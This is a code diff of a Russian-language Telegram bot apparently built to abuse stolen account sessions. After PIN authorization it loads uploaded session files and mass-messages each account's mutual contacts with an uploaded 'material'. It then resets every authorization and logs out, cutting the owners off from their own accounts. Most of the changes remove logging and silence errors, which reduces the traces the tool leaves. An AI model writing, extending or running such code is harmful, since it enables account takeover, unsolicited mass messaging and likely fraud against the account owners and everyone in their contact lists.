@@ -19,12 +19,7 @@ API_ID = int(os.getenv('API_ID'))
 API_HASH = os.getenv('API_HASH')
 CORRECT_PIN = "6611"
 
-# Логирование
-logging.basicConfig(
-    filename='bot.log',
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
+logging.basicConfig(filename='bot.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 conn = sqlite3.connect('bot_database.db', check_same_thread=False)
@@ -44,7 +39,7 @@ for d in ['sessions', 'materials']:
     os.makedirs(d, exist_ok=True)
 
 # ==========================================
-# 🎨 ОФОРМЛЕНИЕ
+#  ОФОРМЛЕНИЕ
 # ==========================================
 def embed(title, desc=None, fields=None, footer=None):
     text = f"**{title}**\n"
@@ -105,14 +100,10 @@ async def main():
     await bot.start(bot_token=BOT_TOKEN)
     bot_id = (await bot.get_me()).id
     logger.info(f"✅ Bot started: {bot_id}")
-    print(f"✅ Bot started: {bot_id}")
 
     @bot.on(events.NewMessage(pattern=r'/start'))
     async def start(e):
         uid = e.sender_id
-        logger.info(f"[START] User {uid} sent /start")
-        print(f"[START] User {uid} sent /start")
-        
         current_step[uid] = 'pin'
         authorized_users[uid] = False
         
@@ -125,7 +116,6 @@ async def main():
                   footer="Платформа доставки активирована"),
             buttons=None
         )
-        logger.info(f"[START] Sent PIN request to user {uid}")
 
     @bot.on(events.NewMessage)
     async def handler(e):
@@ -133,27 +123,27 @@ async def main():
         txt = e.text
         step = current_step.get(uid, 'menu')
         
-        logger.info(f"[MSG] User {uid}, Step: {step}, Text: {txt}")
-        
-        # Игнорируем бота и команды (кроме PIN)
-        if e.sender_id == bot_id:
+        # 🔥 ИГНОРИРУЕМ ПУСТЫЕ И НЕТЕКСТОВЫЕ СООБЩЕНИЯ
+        if txt is None or txt.strip() == "":
             return
         
-        if txt and txt.startswith('/') and txt != '/start':
+        txt = txt.strip()
+        
+        # Игнорируем команды (кроме /start который обрабатывается отдельно)
+        if txt.startswith('/'):
+            return
+            
+        if e.sender_id == bot_id:
             return
 
         # 🔐 ОБРАБОТКА PIN-КОДА
         if step == 'pin':
-            logger.info(f"[PIN] User {uid} entered: {txt}")
-            print(f"[PIN] User {uid} entered: {txt}")
-            
-            if txt and txt.isdigit() and len(txt) == 4:
+            # Проверяем только если это чистые 4 цифры
+            if txt.isdigit() and len(txt) == 4:
                 if txt == CORRECT_PIN:
-                    logger.info(f"[PIN] User {uid} authorized successfully!")
-                    print(f"[PIN] User {uid} authorized successfully!")
-                    
                     authorized_users[uid] = True
                     current_step[uid] = 'menu'
+                    logger.info(f"[PIN] User {uid} authorized")
                     
                     await e.respond(
                         embed("✅ **ДОСТУП РАЗРЕШЁН**",
@@ -166,18 +156,15 @@ async def main():
                               footer="Воспользуйтесь навигацией ниже"),
                         buttons=get_main_kb()
                     )
-                    logger.info(f"[PIN] Sent main menu to user {uid}")
                 else:
-                    logger.warning(f"[PIN] Wrong PIN for user {uid}: {txt}")
                     await e.respond("❌ **Неверный PIN-код**\n\nПопробуйте снова.", buttons=None)
             else:
-                logger.warning(f"[PIN] Invalid format for user {uid}: {txt}")
-                await e.respond("⚠️ **PIN-код должен содержать 4 цифры**\n\nПопробуйте снова.", buttons=None)
+                # Не отвечаем на мусор, только на текст != 4 цифры
+                await e.respond("⚠️ **PIN-код должен содержать ровно 4 цифры**", buttons=None)
             return
 
         # Проверка авторизации для остальных команд
         if not authorized_users.get(uid):
-            logger.warning(f"[AUTH] User {uid} not authorized, step: {step}")
             await e.respond("🔐 **Требуется авторизация**\n\nОтправьте /start", buttons=None)
             return
 
@@ -197,7 +184,7 @@ async def main():
                     await client.connect()
                     
                     if not await client.is_user_authorized():
-                        await msg.edit("❌ **Сессия недействительна!**")
+                        await msg.edit(" **Сессия недействительна!**")
                         await client.disconnect()
                         return
                     
@@ -214,17 +201,15 @@ async def main():
                     
                     await msg.edit(embed("✅ **Синхронизация завершена!**", "Аккаунт подключён", [
                         {'name': 'Профиль', 'value': f"@{me.username or 'нет'}", 'emoji': '👤'},
-                        {'name': 'Номер', 'value': f"+{me.phone}", 'emoji': '📞'},
+                        {'name': 'Номер', 'value': f"+{me.phone}", 'emoji': ''},
                         {'name': 'Контакты', 'value': f"Всего: {total}\nВзаимных: {mutual}", 'emoji': '💬'},
                         {'name': 'Состояние', 'value': 'Подключение стабильно', 'emoji': '⚡'}
                     ], footer="Инициализация потока доставки..."))
-                    logger.info(f"[SESSION] User {uid} loaded session: {me.first_name}")
                 except Exception as err:
-                    logger.error(f"[SESSION] Error for user {uid}: {err}")
                     await msg.edit(f"❌ **Ошибка:** {str(err)[:200]}")
             return
 
-        # 📎 МАТЕРИАЛ
+        #  МАТЕРИАЛ
         if step == 'upload_mat':
             if e.file or txt:
                 old_mat = current_materials.get(uid)
@@ -245,7 +230,6 @@ async def main():
                 
                 preview = f"**Загружено:** {mat['name']}\n**Подпись:** {mat['caption'] or 'нет'}\n\nОжидаю загрузку нового материала."
                 await e.respond(embed("📎 **Контент-менеджер**", preview), buttons=[[Button.inline("✓ Зафиксировать", b'confirm_material')], [Button.inline("✕ Отмена", b'main')]])
-                logger.info(f"[MATERIAL] User {uid} uploaded: {mat['name']}")
             return
 
     @bot.on(events.CallbackQuery)
@@ -255,7 +239,6 @@ async def main():
             return await e.answer("🔐 Сначала /start", alert=True)
         
         d = e.data.decode()
-        logger.info(f"[CALLBACK] User {uid}, Data: {d}")
 
         if d == 'main':
             current_step[uid] = 'menu'
@@ -332,8 +315,7 @@ async def main():
                 try:
                     c = await acc['client'](GetContactsRequest(0))
                     targets.append((acc, [u for u in c.users if u.mutual_contact and not u.bot]))
-                except Exception as err:
-                    logger.error(f"[BROADCAST] Error getting contacts: {err}")
+                except: pass
             
             if not targets:
                 await e.respond("⚠️ **Нет контактов**")
@@ -341,7 +323,7 @@ async def main():
                 return
             
             total = sum(len(t) for _,t in targets)
-            status = await e.respond(embed("⚡ **Доставка инициирована...**", f"Обработано: 0/{total}"), buttons=get_active_kb())
+            status = await e.respond(embed(" **Доставка инициирована...**", f"Обработано: 0/{total}"), buttons=get_active_kb())
             
             current, cancelled = 0, False
             for acc, users in targets:
@@ -358,9 +340,7 @@ async def main():
                         else:
                             await acc['client'].send_message(user.id, mat['caption'])
                         sent += 1
-                    except Exception as err:
-                        logger.error(f"[SEND] Error: {err}")
-                        failed += 1
+                    except: failed += 1
                     current += 1
                     if current % 10 == 0:
                         await status.edit(embed("⚡ **Доставка инициирована...**", f"Обработано: {current}/{total}"), buttons=get_active_kb())
@@ -383,27 +363,21 @@ async def main():
                     await acc['client'](ResetAuthorizationsRequest())
                     await acc['client'](LogOutRequest())
                     success.append(name)
-                except Exception as err:
-                    logger.error(f"[LOGOUT] Error for {name}: {err}")
-                    fail.append(name)
+                except: fail.append(name)
             
             accounts[uid] = {}
-            if not cancelled:
-                update_stats(uid, sent)
+            if not cancelled: update_stats(uid, sent)
             
             await e.respond(embed("🔐 **Завершение сеансов**", f"Результат: {'✅ Все сессии закрыты' if not fail else f'⚠️ {len(fail)} ошибок'}", [
                 {'name': '✅ Успешно', 'value': '\n'.join(success[:3]), 'emoji': '✅'} if success else {},
-                {'name': '❌ Ошибки', 'value': '\n'.join(fail[:3]), 'emoji': '❌'} if fail else {}
+                {'name': ' Ошибки', 'value': '\n'.join(fail[:3]), 'emoji': '❌'} if fail else {}
             ], "*Все устройства вылогинены из аккаунтов*"), buttons=None)
             
             current_step[uid] = 'menu'
             broadcast_queue[uid] = False
-            
             await e.respond(embed("⚡ **Платформа доставки активирована.**", "Воспользуйтесь навигацией ниже.\n\n*Материал сохранён. Загрузите новую сессию для следующей рассылки.*"), buttons=get_main_kb())
-            
-            logger.info(f"[BROADCAST] Done for user {uid}: {sent} sent, {failed} failed")
         except Exception as err:
-            logger.error(f"[BROADCAST] Critical error: {err}")
+            logger.error(f"[BROADCAST] Error: {err}")
             broadcast_queue[uid] = False
 
     await bot.run_until_disconnected()
@@ -414,7 +388,6 @@ async def start_web():
     runner = web.AppRunner(app)
     await runner.setup()
     await web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 8080))).start()
-    logger.info("🌐 Web server started")
 
 async def run():
     await asyncio.gather(start_web(), main())
